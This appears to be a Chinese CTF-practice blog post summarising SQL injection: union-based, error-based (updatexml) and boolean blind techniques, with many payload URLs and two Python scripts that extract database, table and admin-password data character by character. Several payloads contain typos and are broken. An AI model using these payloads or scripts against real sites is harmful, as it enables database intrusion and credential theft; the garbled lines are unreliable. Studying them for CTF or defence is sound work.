---
title: SQL注入小结
date: 2020-11-19 09:11:07
tags: WEB
categories: Technology
---
[TOC]

------



# 1.联合查询注入：

```
http://xxxx.xx/?id=1'
```

```
http://xxxx.xx/?id=1' order by 4#
	union前后的字段数要一致，所以要order by
```


```
http://xxxx.xx/?id=1' union 1,2,3,database()#
​		假设当前数据库:bugku
​		user():
​		database():
​		table_schema:库名
​		table_name:表名
​		column_name:列名

```

```
先介绍几个函数：

一 concat()函数

1、功能：将多个字符串连接成一个字符串。

2、语法：concat(str1, str2,...)　　

返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。

3、语法：concat(str1, seperator,str2,seperator,...)

返回结果为连接参数产生的字符串并且有分隔符，如果有任何一个参数为null，则返回值为null。


二 concat_ws()函数

1、功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符（concat_ws就是concat with separator）

2、语法：concat_ws(separator, str1, str2, ...)

说明：第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。


三 group_concat()函数

1、功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。

2、语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator '分隔符'] )

说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。

```



```
http://xxxx.xx/?id=1' union select 1,2,3,group_concat(schema_name) from information_schema.schemata#

                  列出所有数据库
​		MySQL5.0之后提供information.schema表
​		information_schema.schemata：所有数据库的基本信息，show databases()的结果取自于该表
​		information_schema.tables：所有表
​		information_schema.columns：所有列信息
​		group_concat():连接一个组的所有字符串，并以逗号隔开
​		concat():连接一个或多个字符串
​		concat_ws(p1,p2):第一个参数是分隔符('~')(','),第二个参数嗯。。
```

```
http://xxxx.xx/?id=1' union select 1,2,3,group_concat(table_name) from information_schema.tables where schema_name='flagku'#
http://xxxx.xx/?id=1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='flagku'#
两个都试一下

​		列出flagku库中所有表名
​		假设有flagtable表
```


```
http://xxxx.xx/?id=1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='flagtable'#

​		flagku.flagtable中所有的字段
​		假设有id，pwd
```

```
http://xxxx.xx/?id=1' union select 1,2,3,group_concat(id,'-',pwd) from flagku.flagtable#
http://xxxx.xx/?id=1' union select 1,2,3,group_concat(concat_ws('~',id,pwd)) from flagku.flagtable#
​		爆出id,pwd
```



# 2.报错注入

​	首先提供两个函数：
​		extractvalue() 和 updatexml()

```
http://xxxx.xx/?id=1' and updataexml(1,concat('~',select schema_name from information_schema.schemata limit 0,1),1)
​		获取数据库名
```


```
http://xxxx.xx/?id=1' and updataexml(1,concat('~',select table_name from information_schema.tables where table_schema='flagku' limit 0,1),1)
​		flagku的表名
```

```
http://xxxx.xx/?id=1' and updataexml(1,concat('~',select column_name from information_schema.columns where colume_schema='flagtable' limit 0,1),1)
​		flagku.flagtable的字段名
```

```
http://xxxx.xx/?id=1' and updataexml(1,concat('~',select group_concat(id,'-',pwd) from flagku.flagtable),1)
​		爆id,pwd
```

可以引入substr( )函数和ascii( )函数进行单个字符的比较以及ASCII码的判断

```
L3m0n	sql注入笔记
联合查询注入：

	union select 1,2,3,table_name from information_schema.tables where table_schema='dvwa'
		得到dvwa库的表，假设有user和guest


	union select 1,2,3,column_name from information_schema.columns where table_name='user'
		得到user表的字段，假设有id，pwd

	union select 1,2,id,pwd from dwva.user
		爆库

	经常用到的函数：group_concat(),,,concat()

	union select 1,2,group_concat(distinct table_schema) from information_schema.tables

报错注入：
	先提供两个函数：
		extractvalue()和updatexml()

	admin' or updatexml(1,concat('$',database(),1))#
		假设得到数据库名字geek

	admin' or updatexml(1,concat('$',select group_concat(table_name) from information_schema.tables where table_schema='geek'),1)
		得到表名：geekuser

	admin' or updatexml(1,concat('$',select group_concat(column_name) from information_schema.colunms where table_name='geekuser',1)
		得到字段：id，pwd

	admin' or upatexml(1,concat('$',select concat(id,pwd)from geek.geekuser where id=1)

```

# 3.盲注

```
	length()：返回字符串的长度
	mid(str,pos,num)  :截取指定位置指定长度的字符串
	ascii():查询ascii码中对应的值
	left(string, n)：得到字符串string左边n个字符
	right(string, n)：得到字符串string右边n个字符
	substr(), substring(), mid()函数实现的功能是一样的, 均为截取字符串, 而且用法相同
		第一个参数是想要截取的字符串，第二个参数是起始位置，第三个是要截取的长度
	if(cs1,cs2,cs3):C语言的三目运算符cs1?cs2:cs3相同
	count():用来统计表的行数，也就是统计记录行数
```

### 猜数据库名：

```
1 'and (length(database()))>3#
		之后一直判断，假设数据库长度是4
1' and ascii(substr(database(),1,1))=119#    w
1' and ascii(substr(database(),2,1))=101#    e
1' and ascii(substr(database(),3,1))=98#    b
1' and ascii(substr(database(),4,1))=49#    1
猜测表的个数
	1' and (select count(table_name) from infotmation_schema.tables where table_schema=databases())=2#
```

### 猜表名

```
第一个表：
		1' and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=4#
			第一个表名长度为4
		1' and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)1,1)=102#   f
		1' and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)2,1)=108#   l
		1' and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)3,1)=97#    a
		1' and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)4,1)=103#   g
```

```
第二个表
	1' and length(select table_name from information_schema.tables where table_schema=database() limit 1,1)=5#
		第一个表名长度为4
	1' and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)1,1)=102#   f
	1' and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)2,1)=108#   l
	1' and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)3,1)=97#    a
	1' and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)4,1)=103#   g
	1' and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)4,1)=103#   g
```

### 猜列名：

```
	第一个表列名长度：
		1' and length(select column_name from information_schema.columns where table_scheme=databases() and table_name='flag' limit 1)=4#
			假设列表名长度为4
		1' and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name='flag' limit1)1,1)=102#   f
		1' and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name='flag' limit1)2,1)=108#   a
		1' and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name='flag' limit1)3,1)=97#    l
		1' and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name='flag' limit1)4,1)=103#   g
```

### 猜数据：

```
	1' and (select count(*) from flag)=1#
		有一行数据
	1' and length(select flag from flag limit 1)=26  
		数据长度是26
	1' and ascii(substr(select flag from flag limit 1)1,1)=102#
		第一个字符为f，之后burp跑就oj8k.
```

# 下面是两个盲注的脚本(来自网络)

```python
#coding=utf-8
import requests

def login(_username,_password):
    #需要改动处
    url = "http://xxxxx.xx/login.php"
    data = {
        "username":_username,
        "password":_password
    }
    response = requests.post(url,data=data)
    content = response.content
    #print content
    #这里是判断盲注的单个字符是否正确的条件，一般这个脚本模板在使用之前要修改此处
    #此题是因为注入username字段，当payload后面的语句正确的时候，返回的是密码错误，如果错误返回用户名错误
    #payload=_username = "amin' or (((asCIi(sUBsTring((sELect/**/passWord/**/From/**/admin/**/where/**/username='admin'),%d,1)))=%d))#" %(i,j)
    if "密码错误" in content:
        return True
    else:
        return False

def main():
    find_name = ""
    # i 表示了所要查找的名字的最大长度
    for i in range(0x50):
        # 0x80=128 , 0x20=32,  32-128为可显示的字符的区间
        for j in range(0x80 , 0x20 , -1):
            #mysql 官方注释  "-- " --后面有空格,或者用 "#"
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/gROup_conCAt(sCHEma_name)/**/From/**/inFormation_SChema.scHemata),%d,1)))=%d))#" %(i,j)    #此处是payload,需要改动
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/sCHEma_name/**/From/**/inFormation_SChema.scHemata/**/Limit/**/3,1),%d,1)))=%d))#" %(i,j)
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/group_concat(Table_name)/**/From/**/inFormation_SChema.tAbles/**/where/**/taBle_schema='sql1'),%d,1)))=%d))#" %(i,j)
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/group_concat(columN_name)/**/From/**/inFormation_SChema.columns/**/where/**/taBle_naMe='admin'),%d,1)))=%d))#" %(i,j)
            _username = "amin' or (((asCIi(sUBsTring((sELect/**/passWord/**/From/**/admin/**/where/**/username='admin'),%d,1)))=%d))#" %(i,j)
            #_username = "amin' or (ASCII(sUBsTring((user()),%d,1)=%d )) --" %(i,j)
            #_username = "amin'or(((asCIi(sUBString((sELEct/**/group_concat(scheMA_Name)/**/FRom/**/inforMATion_scheMa.schemaTa),%d,1)))=%d))-- " % (i, j)
            #可改动处
            _password="amin"
            print _username
            if login(_username,_password):
                find_name+=chr(j)
                print find_name
                break

main()

```



```python
# 1.布尔盲注
# 页面有不同的响应word1,word2
# 可猜解数据库长度、个数、名字、表个数、表长度、名字、字段、
# 长度:length，order by
# 个数:count
# 名字：ascii，substr
import requests
import time
from math import ceil
class SqlInject(object):
    headers = {
        "headers":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
    }
    data= {}
    @classmethod
    def judge(cls,url):
        if bool(SqlInject.data):
            result = None
            # print(result)
        else:
            result = requests.get(url=url,headers=SqlInject.headers,timeout=5).text
            return result
    def __init__(self,url,word1,word2):
        self.url = url
        self.word1=word1
        self.word2=word2
    #word1 in result we think you get result
    def get_Current_Db_Len(self):
        for i in range(1,20):
            payload = "?id=1%27+and+(length(database())={})--+".format(i)
            final_payload=self.url+payload
            result = SqlInject.judge(final_payload)
            if self.word1 in result:
                print("database len:"+str(i)+"\n")
                return i
    #information db the number db
    def get_All_Db_Len(self,Db_number):
        for i in range(1,20):
            payload = "?id=1%27+and+(select+((select+length(concat(schema_name))+from+information_schema.schemata+limit+{},1)={}))--+".format(Db_number,i)
            final_payload=self.url+payload
            result = SqlInject.judge(final_payload)
            if self.word1 in result:
                print("Database_len:"+str(i)+"\n")
                return i
    def get_All_Db_Number(self):
        for i in range(1,20):
            payload = "?id=1%27+and+(select+{}=(select count(*) from information_schema.schemata))--+".format(i)
            final_payload=self.url+payload
            result = SqlInject.judge(final_payload)
            if self.word1 in result:
                print("Db_number:"+str(i)+"\n")
                return i
    def get_Current_DbName(self):
        table_list = []
        #二分法获取数据库名
        Namelen = self.get_Current_Db_Len()
        TempLen = 0
        DbName = ""
        try:
            while(True):
                temp_bottom = 33
                temp_top = 126
                while(True):
                    #当前ascii小于temp_top
                    payload = "?id=1%27+and+((ascii(substr(database(),{},1))) < {})--+".format(TempLen+1,temp_top)
                    final_payload=self.url+payload
                    result = SqlInject.judge(final_payload)
                    # print(final_payload)
                    if self.word1 in result:
                        temp_top = (temp_top-ceil((temp_top-temp_bottom)/2))
                        #循环开始后上一次的两个边界之间的差值(作为bottom变化时的标记)
                        interval = ceil((temp_top-temp_bottom)/2)
                        continue
                    #当前ascii大于temp_top
                    payload = "?id=1%27+and+((ascii(substr(database(),{},1))) > {})--+".format(TempLen+1,temp_top)
                    final_payload=self.url+payload
                    result = SqlInject.judge(final_payload)
                    if self.word1 in result:
                        temp_bottom = temp_top
                        temp_top = temp_top + interval
                        continue
                    #当前ascii等于temp_top
                    payload = "?id=1%27+and+((ascii(substr(database(),{},1))) = {})--+".format(TempLen+1,temp_top)
                    final_payload=self.url+payload
                    result = SqlInject.judge(final_payload)
                    if interval == 0:
                        exit("unknown error about variable interval")
                    if self.word1 in result:
                        DbName += chr(temp_top)
                        print("Database_name:"+DbName)
                        TempLen += 1
                        break
                if TempLen == Namelen:
                    table_list.append("Database_name:"+DbName)
                    break
        except Exception as e:
            print("Unknown error:",e)
        return table_list
    def get_All_Db_Name(self):
        number = self.get_All_Db_Number()
        Database_list = []
        for i in range(0,number):
            Database_Name = ""
            #二分法获取每个数据库名
            Namelen = self.get_All_Db_Len(i)
            TempLen = 0
            try:
                while(True):
                    temp_bottom = 33
                    temp_top = 126
                    while(True):
                        #当前ascii小于temp_top
                        payload = "?id=1%27+and+(ascii(substr((select schema_name from information_schema.schemata limit {},1),{},1)) < {})--+".format(i,TempLen+1,temp_top)
                        final_payload=self.url+payload
                        result = SqlInject.judge(final_payload)
                        # print(final_payload)
                        if self.word1 in result:
                            temp_top = (temp_top-ceil((temp_top-temp_bottom)/2))
                            #循环开始后上一次的两个边界之间的差值(作为bottom变化时的标记)
                            interval = ceil((temp_top-temp_bottom)/2)
                            continue
                        #当前ascii大于temp_top
                        payload = "?id=1%27+and+(ascii(substr((select schema_name from information_schema.schemata limit {},1),{},1)) > {})--+".format(i,TempLen+1,temp_top)
                        final_payload=self.url+payload
                        result = SqlInject.judge(final_payload)
                        if self.word1 in result:
                            temp_bottom = temp_top
                            temp_top = temp_top + interval
                            continue
                        #当前ascii等于temp_top
                        payload = "?id=1%27+and+(ascii(substr((select schema_name from information_schema.schemata limit {},1),{},1)) = {})--+".format(i,TempLen+1,temp_top)
                        final_payload=self.url+payload
                        result = SqlInject.judge(final_payload)
                        if interval == 0:
                            exit("unknown error about variable interval")
                        if self.word1 in result:
                            Database_Name += chr(temp_top)
                            print("Database_name:"+Database_Name)
                            TempLen += 1
                            break
                    if TempLen == Namelen:
                        Database_list.append("Database_name:"+Database_Name)
                        break
            except Exception as e:
                print("Unknown error:",e)
        return Database_list
    def get_CurrentDb_Table_Number(self):
        for i in range(1,20):
            payload = "?id=1%27+and+(select+{}=(select+count(*)+from+information_schema.tables+where+table_schema=database()))--+".format(i)
            final_payload=self.url+payload
            result = SqlInject.judge(final_payload)
            if self.word1 in result:
                print("Table_number:"+str(i)+"\n")
                return i
    def get_CurrentDb_TableName_Len(self,table_number):
        for i in range(1,20):
            payload = "?id=1%27+and+(select+((select+length(concat(table_name))+from+information_schema.tables+where+table_schema=database()+limit+{},1)={}))--+".format(table_number,i)
            final_payload=self.url+payload
            result = SqlInject.judge(final_payload)
            if self.word1 in result:
                print("TableName_number:"+str(i)+"\n")
                return i
    def get_CurrentDb_Table_Name(self):
        number = self.get_CurrentDb_Table_Number()
        table_list = []
        for i in range(0,number):
            table_name = ""
            #二分法获取每个表名
            Namelen = self.get_CurrentDb_TableName_Len(i)
            TempLen = 0
            try:
                while(True):
                    temp_bottom = 33
                    temp_top = 126
                    while(True):
                        #当前ascii小于temp_top
                        payload = "?id=1%27+and+(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {},1),{},1)) < {})--+".format(i,TempLen+1,temp_top)
                        final_payload=self.url+payload
                        result = SqlInject.judge(final_payload)
                        # print(final_payload)
                        if self.word1 in result:
                            temp_top = (temp_top-ceil((temp_top-temp_bottom)/2))
                            #循环开始后上一次的两个边界之间的差值(作为bottom变化时的标记)
                            interval = ceil((temp_top-temp_bottom)/2)
                            continue
                        #当前ascii大于temp_top
                        payload = "?id=1%27+and+(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {},1),{},1)) > {})--+".format(i,TempLen+1,temp_top)
                        final_payload=self.url+payload
                        result = SqlInject.judge(final_payload)
                        if self.word1 in result:
                            temp_bottom = temp_top
                            temp_top = temp_top + interval
                            continue
                        #当前ascii等于temp_top
                        payload = "?id=1%27+and+(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {},1),{},1)) = {})--+".format(i,TempLen+1,temp_top)
                        final_payload=self.url+payload
                        result = SqlInject.judge(final_payload)
                        if interval == 0:
                            exit("unknown error about variable interval")
                        if self.word1 in result:
                            table_name += chr(temp_top)
                            print("Table_name:"+table_name)
                            TempLen += 1
                            break
                    if TempLen == Namelen:
                        table_list.append("Table_name:"+table_name)
                        break
            except Exception as e:
                print("Unknown error:",e)
        return table_list
def main():
    url="http://127.0.0.1:8081/Less-8/"
    word1="You are in"
    word2="You are not in"
    sqli = SqlInject(url=url,word1=word1,word2=word2)
    one = float(time.time())
    print(sqli.get_CurrentDb_Table_Name())
    two = float(time.time())
    interval = two-one
    print(interval)
if __name__ == '__main__':
    main()
```

延时盲注和报错盲注没写，暂时就先这样，之后把bugku、buu等平台的SQL注入类型的题全做一遍，再水一篇。







